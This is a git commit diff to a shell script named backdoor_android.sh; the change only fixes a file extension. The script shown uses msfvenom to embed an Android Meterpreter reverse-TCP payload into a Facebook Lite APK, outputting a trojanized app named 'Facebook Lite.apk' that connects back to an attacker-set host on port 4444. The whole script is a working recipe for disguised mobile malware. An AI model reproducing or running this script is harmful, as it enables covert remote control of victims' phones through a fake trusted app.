c28b7b8230fdcce57ad2b642355b80899e3085df
FII14 <121723975+FII14@users.noreply.github.com>
2023-07-16 10:16:34 +0700

    Update backdoor_android.sh

--- backdoor_android.sh
+++ backdoor_android.sh
@@ -2,6 +2,6 @@
 payload="android/meterpreter/reverse_tcp"
 lhost="ip address"
 lport="4444"
-aplikasi="facebook_lite.apt"
+aplikasi="facebook_lite.apk"
 hasil="Facebook Lite.apk"
 msfvenom -p "${payload}"  LHOST="${lhost}" LPORT="${lport}" -x "${aplikasi}" R > "${hasil}"
